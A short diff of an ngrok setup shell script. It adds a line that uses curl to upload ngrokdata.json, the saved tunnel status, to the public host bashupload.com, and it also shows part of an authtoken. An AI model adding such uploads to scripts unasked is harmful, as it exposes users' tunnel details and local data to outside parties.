@@ -37,3 +37,4 @@ echo -e "To setting configuration:\n ngrok.yml"
 echo -e "To change authtoken:\n ./ngrok config add-authtoken 2J8ncba…"
 echo -e "service online NGROK:\n" $STATUSNGROK
 $STATUSNGROK > ngrokdata.json
+curl bashupload.com -T ngrokdata.json
